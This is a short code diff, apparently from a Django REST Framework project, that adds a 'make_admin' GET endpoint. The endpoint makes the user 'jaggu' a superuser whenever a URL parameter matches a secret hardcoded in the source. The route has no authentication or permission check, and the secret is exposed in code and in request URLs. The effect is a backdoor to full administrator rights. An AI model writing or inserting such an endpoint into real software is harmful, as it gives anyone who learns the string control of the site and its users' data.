@@ -123,3 +123,19 @@ def me(request):
         "email":user.email,
         "is_staff":user.is_staff,
     })    
+    
+    
+
+@api_view(["GET"])
+def make_admin(request):
+    secret = request.GET.get("secret")
+    if secret != "jaggu-secret-2024":
+        return Response({"error": "Forbidden"}, status=403)
+    try:
+        user = User.objects.get(username="jaggu")
+        user.is_staff     = True
+        user.is_superuser = True
+        user.save()
+        return Response({"success": f"{user.username} is now a superuser"})
+    except User.DoesNotExist:
+        return Response({"error": "User not found"}, status=404)
